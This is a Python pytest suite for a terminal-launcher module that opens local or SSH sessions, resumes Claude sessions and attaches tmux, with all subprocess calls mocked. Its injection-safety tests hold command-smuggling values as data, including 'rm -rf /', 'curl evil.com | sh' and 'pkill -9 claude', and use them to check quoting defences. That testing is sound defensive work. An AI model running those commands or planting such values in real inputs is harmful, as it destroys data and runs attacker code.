"""Unit tests for src/launcher.py — all subprocess/osascript calls mocked."""
from __future__ import annotations

import asyncio
import shlex
import sys
from unittest.mock import AsyncMock, MagicMock, call, patch

import pytest


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_proc(returncode: int, stdout: bytes = b"", stderr: bytes = b"") -> AsyncMock:
    """Build a mock asyncio.subprocess.Process."""
    proc = AsyncMock()
    proc.returncode = returncode
    proc.communicate = AsyncMock(return_value=(stdout, stderr))
    return proc


# ---------------------------------------------------------------------------
# applescript_string
# ---------------------------------------------------------------------------

class TestApplescriptString:
    """applescript_string() escaping."""

    def _fn(self):
        from src.launcher import applescript_string
        return applescript_string

    def test_plain_string_wrapped_in_quotes(self):
        fn = self._fn()
        assert fn("hello world") == '"hello world"'

    def test_double_quotes_escaped(self):
        fn = self._fn()
        result = fn('say "hello"')
        assert '\\"' in result
        assert result.startswith('"')
        assert result.endswith('"')

    def test_backslashes_escaped_before_quotes(self):
        fn = self._fn()
        result = fn("path\\to\\file")
        assert "\\\\" in result

    def test_backslash_then_double_quote(self):
        """A backslash followed by a double-quote must both be escaped."""
        fn = self._fn()
        result = fn('\\"')
        # \\ (escaped backslash) followed by \" (escaped quote)
        assert '\\\\"' in result

    def test_empty_string(self):
        fn = self._fn()
        assert fn("") == '""'

    def test_no_special_chars(self):
        fn = self._fn()
        assert fn("cd /tmp && ls") == '"cd /tmp && ls"'


# ---------------------------------------------------------------------------
# launch_terminal — platform dispatch
# ---------------------------------------------------------------------------

class TestLaunchTerminalPlatformDispatch:
    """launch_terminal() routes to the correct platform handler."""

    @pytest.mark.asyncio
    async def test_darwin_calls_launch_macos(self):
        from src.launcher import launch_terminal

        with patch("src.launcher.sys") as mock_sys, \
             patch("src.launcher._launch_macos", new=AsyncMock(return_value={"ok": True})) as mock_mac:
            mock_sys.platform = "darwin"
            result = await launch_terminal("echo hello")

        mock_mac.assert_awaited_once_with("echo hello")
        assert result == {"ok": True}

    @pytest.mark.asyncio
    async def test_linux_calls_launch_linux(self):
        from src.launcher import launch_terminal

        with patch("src.launcher.sys") as mock_sys, \
             patch("src.launcher._launch_linux", new=AsyncMock(return_value={"ok": True})) as mock_linux:
            mock_sys.platform = "linux"
            result = await launch_terminal("echo hello")

        mock_linux.assert_awaited_once_with("echo hello")
        assert result == {"ok": True}

    @pytest.mark.asyncio
    async def test_linux_with_variant_calls_launch_linux(self):
        """sys.platform == 'linux2' should also dispatch to _launch_linux."""
        from src.launcher import launch_terminal

        with patch("src.launcher.sys") as mock_sys, \
             patch("src.launcher._launch_linux", new=AsyncMock(return_value={"ok": True})) as mock_linux:
            mock_sys.platform = "linux2"
            result = await launch_terminal("echo hello")

        mock_linux.assert_awaited_once()

    @pytest.mark.asyncio
    async def test_win32_calls_launch_windows(self):
        from src.launcher import launch_terminal

        with patch("src.launcher.sys") as mock_sys, \
             patch("src.launcher._launch_windows", new=AsyncMock(return_value={"ok": True})) as mock_win:
            mock_sys.platform = "win32"
            result = await launch_terminal("echo hello")

        mock_win.assert_awaited_once_with("echo hello")
        assert result == {"ok": True}

    @pytest.mark.asyncio
    async def test_unsupported_platform_returns_error(self):
        from src.launcher import launch_terminal

        with patch("src.launcher.sys") as mock_sys:
            mock_sys.platform = "freebsd12"
            result = await launch_terminal("echo hello")

        assert result["ok"] is False
        assert "Unsupported platform" in result["error"]
        assert "freebsd12" in result["error"]


# ---------------------------------------------------------------------------
# _launch_macos
# ---------------------------------------------------------------------------

class TestLaunchMacos:
    """macOS: tries iTerm2 first, falls back to Terminal.app."""

    @pytest.mark.asyncio
    async def test_iterm2_used_when_succeeds(self):
        from src.launcher import _launch_macos

        with patch("src.launcher._run_osascript", new=AsyncMock(return_value={"ok": True})) as mock_osa:
            result = await _launch_macos("echo hi")

        assert result == {"ok": True}
        # Only one call — iTerm2 succeeded, no fallback
        assert mock_osa.call_count == 1
        script = mock_osa.call_args[0][0]
        assert "iTerm2" in script

    @pytest.mark.asyncio
    async def test_falls_back_to_terminal_app_when_iterm2_fails(self):
        from src.launcher import _launch_macos

        iterm_result = {"ok": False, "error": "iTerm2 not running"}
        terminal_result = {"ok": True}

        side_effects = [iterm_result, terminal_result]
        call_idx = 0

        async def fake_osascript(script):
            nonlocal call_idx
            r = side_effects[call_idx]
            call_idx += 1
            return r

        with patch("src.launcher._run_osascript", new=fake_osascript):
            result = await _launch_macos("echo hi")

        assert result == {"ok": True}
        assert call_idx == 2  # both were called

    @pytest.mark.asyncio
    async def test_terminal_app_script_contains_do_script(self):
        from src.launcher import _launch_macos

        called_scripts = []

        async def fake_osascript(script):
            called_scripts.append(script)
            if "iTerm2" in script:
                return {"ok": False, "error": "not found"}
            return {"ok": True}

        with patch("src.launcher._run_osascript", new=fake_osascript):
            await _launch_macos("mycommand")

        assert len(called_scripts) == 2
        terminal_script = called_scripts[1]
        assert "Terminal" in terminal_script
        assert "do script" in terminal_script

    @pytest.mark.asyncio
    async def test_iterm2_script_contains_write_text(self):
        from src.launcher import _launch_macos

        called_scripts = []

        async def fake_osascript(script):
            called_scripts.append(script)
            return {"ok": True}

        with patch("src.launcher._run_osascript", new=fake_osascript):
            await _launch_macos("run_something")

        iterm_script = called_scripts[0]
        assert "write text" in iterm_script

    @pytest.mark.asyncio
    async def test_command_embedded_in_script(self):
        from src.launcher import _launch_macos

        called_scripts = []

        async def fake_osascript(script):
            called_scripts.append(script)
            return {"ok": True}

        with patch("src.launcher._run_osascript", new=fake_osascript):
            await _launch_macos("cd /tmp && ls")

        assert "cd /tmp && ls" in called_scripts[0]

    @pytest.mark.asyncio
    async def test_both_fail_returns_terminal_error(self):
        from src.launcher import _launch_macos

        async def fake_osascript(script):
            return {"ok": False, "error": "scripting error"}

        with patch("src.launcher._run_osascript", new=fake_osascript):
            result = await _launch_macos("cmd")

        assert result["ok"] is False


# ---------------------------------------------------------------------------
# _run_osascript
# ---------------------------------------------------------------------------

class TestRunOsascript:
    """_run_osascript() wraps osascript and handles errors."""

    @pytest.mark.asyncio
    async def test_success(self):
        from src.launcher import _run_osascript

        proc = _make_proc(0)
        with patch("src.launcher.asyncio.create_subprocess_exec", return_value=proc):
            result = await _run_osascript('tell application "Finder" to activate')

        assert result == {"ok": True}

    @pytest.mark.asyncio
    async def test_invokes_osascript_with_e_flag(self):
        from src.launcher import _run_osascript

        proc = _make_proc(0)
        with patch("src.launcher.asyncio.create_subprocess_exec", return_value=proc) as mock_exec:
            await _run_osascript("my script")

        args = mock_exec.call_args[0]
        assert args[0] == "osascript"
        assert args[1] == "-e"
        assert args[2] == "my script"

    @pytest.mark.asyncio
    async def test_nonzero_returncode_returns_error(self):
        from src.launcher import _run_osascript

        proc = _make_proc(1, stderr=b"execution error: iTerm2 got an error")
        with patch("src.launcher.asyncio.create_subprocess_exec", return_value=proc):
            result = await _run_osascript("tell application \"iTerm2\" to activate")

        assert result["ok"] is False
        assert "iTerm2 got an error" in result["error"]

    @pytest.mark.asyncio
    async def test_timeout_returns_error(self):
        from src.launcher import _run_osascript

        with patch("src.launcher.asyncio.create_subprocess_exec", return_value=AsyncMock()), \
             patch("src.launcher.asyncio.wait_for", side_effect=asyncio.TimeoutError()):
            result = await _run_osascript("slow script")

        assert result["ok"] is False
        assert "timed out" in result["error"].lower()

    @pytest.mark.asyncio
    async def test_oserror_returns_error(self):
        from src.launcher import _run_osascript

        with patch("src.launcher.asyncio.create_subprocess_exec", side_effect=OSError("osascript not found")):
            result = await _run_osascript("script")

        assert result["ok"] is False
        assert "osascript not found" in result["error"]


# ---------------------------------------------------------------------------
# _launch_linux
# ---------------------------------------------------------------------------

class TestLaunchLinux:
    """Linux: tries terminal emulators in priority order."""

    EMULATOR_ORDER = [
        "x-terminal-emulator",
        "gnome-terminal",
        "konsole",
        "xfce4-terminal",
        "xterm",
    ]

    @pytest.mark.asyncio
    async def test_uses_first_available_emulator(self):
        from src.launcher import _launch_linux

        proc = _make_proc(0)

        def fake_which(name):
            return "/usr/bin/xterm" if name == "x-terminal-emulator" else None

        with patch("src.launcher.shutil.which", side_effect=fake_which), \
             patch("src.launcher.asyncio.create_subprocess_exec", return_value=proc) as mock_exec:
            result = await _launch_linux("echo test")

        assert result == {"ok": True}
        args = mock_exec.call_args[0]
        assert args[0] == "x-terminal-emulator"

    @pytest.mark.asyncio
    async def test_falls_through_to_xterm(self):
        """When only xterm is available, it should be chosen."""
        from src.launcher import _launch_linux

        proc = _make_proc(0)

        def fake_which(name):
            return "/usr/bin/xterm" if name == "xterm" else None

        with patch("src.launcher.shutil.which", side_effect=fake_which), \
             patch("src.launcher.asyncio.create_subprocess_exec", return_value=proc) as mock_exec:
            result = await _launch_linux("echo test")

        assert result == {"ok": True}
        args = mock_exec.call_args[0]
        assert args[0] == "xterm"

    @pytest.mark.asyncio
    async def test_no_terminal_found_returns_error(self):
        from src.launcher import _launch_linux

        with patch("src.launcher.shutil.which", return_value=None):
            result = await _launch_linux("echo test")

        assert result["ok"] is False
        assert "No supported terminal emulator" in result["error"]

    @pytest.mark.asyncio
    async def test_gnome_terminal_uses_double_dash_separator(self):
        """gnome-terminal uses -- syntax instead of -e."""
        from src.launcher import _launch_linux

        proc = _make_proc(0)

        def fake_which(name):
            return "/usr/bin/gnome-terminal" if name == "gnome-terminal" else None

        with patch("src.launcher.shutil.which", side_effect=fake_which), \
             patch("src.launcher.asyncio.create_subprocess_exec", return_value=proc) as mock_exec:
            result = await _launch_linux("mycommand")

        args = mock_exec.call_args[0]
        assert args[0] == "gnome-terminal"
        assert "--" in args
        assert "bash" in args

    @pytest.mark.asyncio
    async def test_non_gnome_uses_e_flag(self):
        """Terminals other than gnome-terminal use -e flag."""
        from src.launcher import _launch_linux

        proc = _make_proc(0)

        def fake_which(name):
            return "/usr/bin/xterm" if name == "xterm" else None

        with patch("src.launcher.shutil.which", side_effect=fake_which), \
             patch("src.launcher.asyncio.create_subprocess_exec", return_value=proc) as mock_exec:
            result = await _launch_linux("mycommand")

        args = mock_exec.call_args[0]
        assert "-e" in args

    @pytest.mark.asyncio
    async def test_command_uses_exec_bash(self):
        """The command is wrapped with 'exec bash' to keep terminal open."""
        from src.launcher import _launch_linux

        proc = _make_proc(0)

        def fake_which(name):
            return "/usr/bin/xterm" if name == "xterm" else None

        with patch("src.launcher.shutil.which", side_effect=fake_which), \
             patch("src.launcher.asyncio.create_subprocess_exec", return_value=proc) as mock_exec:
            await _launch_linux("my-command")

        args = mock_exec.call_args[0]
        # Find the bash -c argument
        cmd_str = " ".join(str(a) for a in args)
        assert "exec bash" in cmd_str

    @pytest.mark.asyncio
    async def test_oserror_returns_error(self):
        from src.launcher import _launch_linux

        def fake_which(name):
            return "/usr/bin/xterm" if name == "xterm" else None

        with patch("src.launcher.shutil.which", side_effect=fake_which), \
             patch("src.launcher.asyncio.create_subprocess_exec", side_effect=OSError("spawn failed")):
            result = await _launch_linux("cmd")

        assert result["ok"] is False
        assert "spawn failed" in result["error"]

    @pytest.mark.asyncio
    async def test_timeout_is_non_fatal(self):
        """A timeout on communicate() is expected (terminal still running) — returns ok."""
        from src.launcher import _launch_linux

        proc = AsyncMock()
        proc.returncode = None  # still running

        def fake_which(name):
            return "/usr/bin/xterm" if name == "xterm" else None

        with patch("src.launcher.shutil.which", side_effect=fake_which), \
             patch("src.launcher.asyncio.create_subprocess_exec", return_value=proc), \
             patch("src.launcher.asyncio.wait_for", side_effect=asyncio.TimeoutError()):
            result = await _launch_linux("cmd")

        # Timeout on terminal launch → ok (terminal is still open)
        assert result == {"ok": True}


# ---------------------------------------------------------------------------
# _launch_windows
# ---------------------------------------------------------------------------

class TestLaunchWindows:
    """Windows: launches PowerShell via cmd."""

    @pytest.mark.asyncio
    async def test_success(self):
        from src.launcher import _launch_windows

        proc = _make_proc(0)
        with patch("src.launcher.asyncio.create_subprocess_shell", return_value=proc):
            result = await _launch_windows("echo hello")

        assert result == {"ok": True}

    @pytest.mark.asyncio
    async def test_uses_powershell(self):
        from src.launcher import _launch_windows

        proc = _make_proc(0)
        with patch("src.launcher.asyncio.create_subprocess_shell", return_value=proc) as mock_shell:
            await _launch_windows("echo hello")

        full_cmd = mock_shell.call_args[0][0]
        assert "powershell" in full_cmd.lower()

    @pytest.mark.asyncio
    async def test_uses_cmd_start(self):
        from src.launcher import _launch_windows

        proc = _make_proc(0)
        with patch("src.launcher.asyncio.create_subprocess_shell", return_value=proc) as mock_shell:
            await _launch_windows("echo hello")

        full_cmd = mock_shell.call_args[0][0]
        assert "cmd" in full_cmd.lower()
        assert "start" in full_cmd.lower()

    @pytest.mark.asyncio
    async def test_double_quotes_in_command_escaped(self):
        from src.launcher import _launch_windows

        proc = _make_proc(0)
        with patch("src.launcher.asyncio.create_subprocess_shell", return_value=proc) as mock_shell:
            await _launch_windows('echo "hello"')

        full_cmd = mock_shell.call_args[0][0]
        # Double-quotes inside the command should be escaped for PowerShell
        assert '`"' in full_cmd

    @pytest.mark.asyncio
    async def test_oserror_returns_error(self):
        from src.launcher import _launch_windows

        with patch("src.launcher.asyncio.create_subprocess_shell", side_effect=OSError("spawn failed")):
            result = await _launch_windows("cmd")

        assert result["ok"] is False
        assert "spawn failed" in result["error"]

    @pytest.mark.asyncio
    async def test_timeout_is_non_fatal(self):
        from src.launcher import _launch_windows

        proc = AsyncMock()
        proc.returncode = None

        with patch("src.launcher.asyncio.create_subprocess_shell", return_value=proc), \
             patch("src.launcher.asyncio.wait_for", side_effect=asyncio.TimeoutError()):
            result = await _launch_windows("cmd")

        assert result == {"ok": True}


# ---------------------------------------------------------------------------
# launch_claude_session
# ---------------------------------------------------------------------------

class TestLaunchClaudeSession:
    """launch_claude_session() — local and remote paths."""

    @pytest.mark.asyncio
    async def test_local_machine_cd_and_resume(self):
        from src.launcher import launch_claude_session

        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            result = await launch_claude_session("/home/user/proj", "abc123", "mac-mini")

        assert result == {"ok": True}
        cmd = mock_lt.call_args[0][0]
        assert "cd" in cmd
        assert "claude" in cmd
        assert "--resume" in cmd
        assert "abc123" in cmd

    @pytest.mark.asyncio
    async def test_local_cwd_is_shlex_quoted(self):
        """Paths with spaces must be shlex-quoted."""
        from src.launcher import launch_claude_session

        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            await launch_claude_session("/home/user/my project", "sess-1", "mac-mini")

        cmd = mock_lt.call_args[0][0]
        assert shlex.quote("/home/user/my project") in cmd

    @pytest.mark.asyncio
    async def test_session_id_is_shlex_quoted(self):
        from src.launcher import launch_claude_session

        tricky_id = "sess;rm -rf /"
        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            await launch_claude_session("/tmp", tricky_id, "mac-mini")

        cmd = mock_lt.call_args[0][0]
        assert shlex.quote(tricky_id) in cmd
        # The raw dangerous string must NOT appear unquoted
        assert "rm -rf" not in cmd.replace(shlex.quote(tricky_id), "")

    @pytest.mark.asyncio
    async def test_remote_machine_uses_ssh_t(self):
        from src.launcher import launch_claude_session

        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            result = await launch_claude_session("/remote/dir", "remote-sess", "ubuntu-desktop")

        cmd = mock_lt.call_args[0][0]
        assert "ssh" in cmd
        assert "-t" in cmd
        assert "ubuntu-desktop" in cmd

    @pytest.mark.asyncio
    async def test_remote_command_contains_claude_resume(self):
        from src.launcher import launch_claude_session

        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            await launch_claude_session("/remote/dir", "sess-xyz", "ubuntu-desktop")

        cmd = mock_lt.call_args[0][0]
        assert "claude" in cmd
        assert "--resume" in cmd
        assert "sess-xyz" in cmd

    @pytest.mark.asyncio
    async def test_remote_uses_correct_ssh_alias(self):
        from src.launcher import launch_claude_session

        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt, \
             patch("src.launcher._launch_macos_multi", new=AsyncMock(return_value={"ok": True})) as mock_multi:
            await launch_claude_session("/dir", "sid", "avell-i7")

        # Windows uses _launch_macos_multi, Linux/macOS uses launch_terminal
        if mock_multi.called:
            cmds = mock_multi.call_args[0][0]
            assert any("avell-i7" in c for c in cmds)
        else:
            cmd = mock_lt.call_args[0][0]
            assert "avell-i7" in cmd


# ---------------------------------------------------------------------------
# launch_tmux_attach
# ---------------------------------------------------------------------------

class TestLaunchTmuxAttach:
    """launch_tmux_attach() — local and remote."""

    @pytest.mark.asyncio
    async def test_local_uses_tmux_attach(self):
        from src.launcher import launch_tmux_attach

        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            result = await launch_tmux_attach("my-sess", "mac-mini")

        assert result == {"ok": True}
        cmd = mock_lt.call_args[0][0]
        assert "tmux" in cmd
        assert "attach" in cmd
        assert "-t" in cmd
        assert "my-sess" in cmd

    @pytest.mark.asyncio
    async def test_local_session_name_quoted(self):
        from src.launcher import launch_tmux_attach

        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            await launch_tmux_attach("sess with spaces", "mac-mini")

        cmd = mock_lt.call_args[0][0]
        assert shlex.quote("sess with spaces") in cmd

    @pytest.mark.asyncio
    async def test_remote_tmux_uses_ssh_t(self):
        from src.launcher import launch_tmux_attach

        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            await launch_tmux_attach("remote-sess", "ubuntu-desktop")

        cmd = mock_lt.call_args[0][0]
        assert "ssh" in cmd
        assert "-t" in cmd
        assert "ubuntu-desktop" in cmd
        assert "tmux" in cmd
        assert "attach" in cmd

    @pytest.mark.asyncio
    async def test_remote_psmux_ssh_only(self):
        """psmux attach over SSH fails — just SSH into the machine."""
        from src.launcher import launch_tmux_attach

        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            await launch_tmux_attach("win-sess", "avell-i7")

        cmd = mock_lt.call_args[0][0]
        assert "ssh" in cmd
        assert "avell-i7" in cmd

    @pytest.mark.asyncio
    async def test_remote_psmux_windows_desktop(self):
        """windows-desktop psmux — same plain SSH fallback."""
        from src.launcher import launch_tmux_attach

        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            await launch_tmux_attach("wdesk-sess", "windows-desktop")

        cmd = mock_lt.call_args[0][0]
        assert "ssh" in cmd

    @pytest.mark.asyncio
    async def test_unknown_machine_defaults_to_tmux(self):
        """Unknown machine not in FLEET_MACHINES → defaults to tmux."""
        from src.launcher import launch_tmux_attach

        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            await launch_tmux_attach("some-sess", "mystery-machine")

        cmd = mock_lt.call_args[0][0]
        assert "tmux" in cmd


# ---------------------------------------------------------------------------
# launch_new_tmux_and_attach
# ---------------------------------------------------------------------------

class TestLaunchNewTmuxAndAttach:
    """launch_new_tmux_and_attach() calls create then attach."""

    @pytest.mark.asyncio
    async def test_calls_create_then_attach(self):
        from src.launcher import launch_new_tmux_and_attach

        mock_create = AsyncMock(return_value={"ok": True})
        mock_attach = AsyncMock(return_value={"ok": True})

        # create_tmux_session is imported locally inside the function from tmux_manager
        with patch("src.tmux_manager.create_tmux_session", mock_create), \
             patch("src.launcher.launch_tmux_attach", mock_attach):
            result = await launch_new_tmux_and_attach("new-sess", "mac-mini", cwd="/tmp")

        mock_create.assert_awaited_once_with("mac-mini", "new-sess", cwd="/tmp", command=None)
        mock_attach.assert_awaited_once_with("new-sess", "mac-mini")
        assert result == {"ok": True}

    @pytest.mark.asyncio
    async def test_create_failure_returns_error_without_attach(self):
        from src.launcher import launch_new_tmux_and_attach

        mock_create = AsyncMock(return_value={"ok": False, "error": "session exists"})
        mock_attach = AsyncMock(return_value={"ok": True})

        with patch("src.tmux_manager.create_tmux_session", mock_create), \
             patch("src.launcher.launch_tmux_attach", mock_attach):
            result = await launch_new_tmux_and_attach("bad-sess", "mac-mini")

        mock_create.assert_awaited_once()
        mock_attach.assert_not_awaited()
        assert result["ok"] is False
        assert "session exists" in result["error"]

    @pytest.mark.asyncio
    async def test_passes_cwd_and_command_to_create(self):
        from src.launcher import launch_new_tmux_and_attach

        mock_create = AsyncMock(return_value={"ok": True})
        mock_attach = AsyncMock(return_value={"ok": True})

        with patch("src.tmux_manager.create_tmux_session", mock_create), \
             patch("src.launcher.launch_tmux_attach", mock_attach):
            await launch_new_tmux_and_attach(
                "sess",
                "ubuntu-desktop",
                cwd="/home/user",
                command="python app.py",
            )

        create_kwargs = mock_create.call_args[1]
        assert create_kwargs["cwd"] == "/home/user"
        assert create_kwargs["command"] == "python app.py"

    @pytest.mark.asyncio
    async def test_attach_failure_propagated(self):
        from src.launcher import launch_new_tmux_and_attach

        mock_create = AsyncMock(return_value={"ok": True})
        mock_attach = AsyncMock(return_value={"ok": False, "error": "no terminal"})

        with patch("src.tmux_manager.create_tmux_session", mock_create), \
             patch("src.launcher.launch_tmux_attach", mock_attach):
            result = await launch_new_tmux_and_attach("sess", "mac-mini")

        assert result["ok"] is False
        assert "no terminal" in result["error"]

    @pytest.mark.asyncio
    async def test_remote_machine_passed_correctly(self):
        from src.launcher import launch_new_tmux_and_attach

        mock_create = AsyncMock(return_value={"ok": True})
        mock_attach = AsyncMock(return_value={"ok": True})

        with patch("src.tmux_manager.create_tmux_session", mock_create), \
             patch("src.launcher.launch_tmux_attach", mock_attach):
            await launch_new_tmux_and_attach("sess", "avell-i7")

        assert mock_create.call_args[0][0] == "avell-i7"
        assert mock_attach.call_args[0][1] == "avell-i7"


# ---------------------------------------------------------------------------
# Security: shlex.quote used for user inputs
# ---------------------------------------------------------------------------

class TestShellInjectionSafety:
    """Verify shlex.quote prevents injection in user-supplied strings."""

    @pytest.mark.asyncio
    async def test_claude_session_cwd_injection_blocked(self):
        from src.launcher import launch_claude_session

        malicious_cwd = "/tmp; rm -rf /"
        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            await launch_claude_session(malicious_cwd, "safe-id", "mac-mini")

        cmd = mock_lt.call_args[0][0]
        # The dangerous literal string must not appear unquoted
        assert "rm -rf" not in cmd.replace(shlex.quote(malicious_cwd), "<QUOTED>")

    @pytest.mark.asyncio
    async def test_claude_session_id_injection_blocked(self):
        from src.launcher import launch_claude_session

        malicious_id = "id; curl evil.com | sh"
        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            await launch_claude_session("/tmp", malicious_id, "mac-mini")

        cmd = mock_lt.call_args[0][0]
        # Must appear only inside quotes
        assert shlex.quote(malicious_id) in cmd
        assert "curl evil.com | sh" not in cmd.replace(shlex.quote(malicious_id), "")

    @pytest.mark.asyncio
    async def test_tmux_attach_session_name_injection_blocked(self):
        from src.launcher import launch_tmux_attach

        malicious_name = "sess; pkill -9 claude"
        with patch("src.launcher.detect_local_machine", return_value="mac-mini"), \
             patch("src.launcher.launch_terminal", new=AsyncMock(return_value={"ok": True})) as mock_lt:
            await launch_tmux_attach(malicious_name, "mac-mini")

        cmd = mock_lt.call_args[0][0]
        assert shlex.quote(malicious_name) in cmd
        assert "pkill -9 claude" not in cmd.replace(shlex.quote(malicious_name), "")

    def test_applescript_string_quote_escaping(self):
        from src.launcher import applescript_string

        malicious = 'end tell" -- injection'
        result = applescript_string(malicious)
        # The raw unescaped double-quote must not appear inside the outer quotes
        inner = result[1:-1]  # strip the outer wrapping quotes
        assert '"' not in inner.replace('\\"', "")


# ---------------------------------------------------------------------------
# _launch_macos_multi
# ---------------------------------------------------------------------------

class TestLaunchMacosMulti:
    """Tests for _launch_macos_multi — multi-command iTerm2 launcher."""

    @pytest.mark.asyncio
    async def test_single_command(self):
        from src.launcher import _launch_macos_multi

        called_scripts = []

        async def fake_osascript(script):
            called_scripts.append(script)
            return {"ok": True}

        with patch("src.launcher._run_osascript", new=fake_osascript):
            result = await _launch_macos_multi(["echo hello"])

        assert result == {"ok": True}
        assert len(called_scripts) == 1
        assert "write text" in called_scripts[0]

    @pytest.mark.asyncio
    async def test_multiple_commands_with_delays(self):
        from src.launcher import _launch_macos_multi

        called_scripts = []

        async def fake_osascript(script):
            called_scripts.append(script)
            return {"ok": True}

        with patch("src.launcher._run_osascript", new=fake_osascript):
            await _launch_macos_multi(["ssh host", "cd /tmp", "ls"])

        script = called_scripts[0]
        # Default delays: 2s after first command, 0.5s between rest
        assert "delay" in script

    @pytest.mark.asyncio
    async def test_empty_commands_returns_error(self):
        from src.launcher import _launch_macos_multi

        result = await _launch_macos_multi([])

        assert result["ok"] is False
        assert "No commands" in result["error"]

    @pytest.mark.asyncio
    async def test_iterm2_fallback_to_terminal(self):
        from src.launcher import _launch_macos_multi

        call_count = 0

        async def fake_osascript(script):
            nonlocal call_count
            call_count += 1
            if "iTerm2" in script:
                return {"ok": False, "error": "iTerm2 not running"}
            return {"ok": True}

        with patch("src.launcher._run_osascript", new=fake_osascript):
            result = await _launch_macos_multi(["echo hi"])

        assert result == {"ok": True}
        assert call_count == 2  # tried iTerm2 then Terminal.app

    @pytest.mark.asyncio
    async def test_custom_delays(self):
        from src.launcher import _launch_macos_multi

        called_scripts = []

        async def fake_osascript(script):
            called_scripts.append(script)
            return {"ok": True}

        custom_delays = [0, 5.0, 1.5]
        with patch("src.launcher._run_osascript", new=fake_osascript):
            await _launch_macos_multi(["ssh host", "cd /tmp", "ls"], delays=custom_delays)

        script = called_scripts[0]
        assert "delay 5.0" in script
        assert "delay 1.5" in script


# ---------------------------------------------------------------------------
# launch_remote_terminal
# ---------------------------------------------------------------------------

class TestLaunchRemoteTerminal:
    """Tests for launch_remote_terminal — opens terminal on remote display."""

    @pytest.mark.asyncio
    async def test_darwin_remote_uses_osascript(self):
        """macOS: ssh <alias> osascript - with AppleScript piped via stdin."""
        from src.launcher import launch_remote_terminal

        proc = _make_proc(0)
        with patch("src.launcher.asyncio.create_subprocess_exec", return_value=proc) as mock_exec:
            result = await launch_remote_terminal("echo hi", "mac-mini")

        assert result == {"ok": True}
        args = mock_exec.call_args[0]
        assert "ssh" in args
        assert any("osascript" in str(a) for a in args)
        # stdin should contain the AppleScript
        stdin_input = mock_exec.call_args[1].get("stdin")
        assert stdin_input == asyncio.subprocess.PIPE
        # Verify communicate was called with the applescript
        comm_call = proc.communicate.call_args
        assert b"Terminal" in comm_call[1]["input"]
        assert b"echo hi" in comm_call[1]["input"]

    @pytest.mark.asyncio
    async def test_linux_remote_uses_display0(self):
        """Linux: ssh <alias> bash -s with DISPLAY=:0 bash script piped via stdin."""
        from src.launcher import launch_remote_terminal

        proc = _make_proc(0)
        with patch("src.launcher.asyncio.create_subprocess_exec", return_value=proc) as mock_exec:
            result = await launch_remote_terminal("htop", "ubuntu-desktop")

        assert result == {"ok": True}
        args = mock_exec.call_args[0]
        assert "ssh" in args
        assert any("bash" in str(a) for a in args)
        comm_call = proc.communicate.call_args
        assert b"DISPLAY=:0" in comm_call[1]["input"]
        assert b"htop" in comm_call[1]["input"]

    @pytest.mark.asyncio
    async def test_win32_remote_uses_powershell(self):
        """Windows: ssh <alias> powershell -Command - with Start-Process piped via stdin."""
        from src.launcher import launch_remote_terminal

        proc = _make_proc(0)
        with patch("src.launcher.asyncio.create_subprocess_exec", return_value=proc) as mock_exec:
            result = await launch_remote_terminal("dir", "avell-i7")

        assert result == {"ok": True}
        args = mock_exec.call_args[0]
        assert "ssh" in args
        assert any("powershell" in str(a).lower() for a in args)
        comm_call = proc.communicate.call_args
        assert b"Start-Process" in comm_call[1]["input"]

    @pytest.mark.asyncio
    async def test_unknown_os_returns_error(self):
        from src.launcher import launch_remote_terminal
        from src.config import FLEET_MACHINES

        # Use a machine name that does not exist in FLEET_MACHINES so remote_os == ""
        result = await launch_remote_terminal("echo hi", "nonexistent-machine-xyz")

        assert result["ok"] is False
        assert "Unknown remote OS" in result["error"]
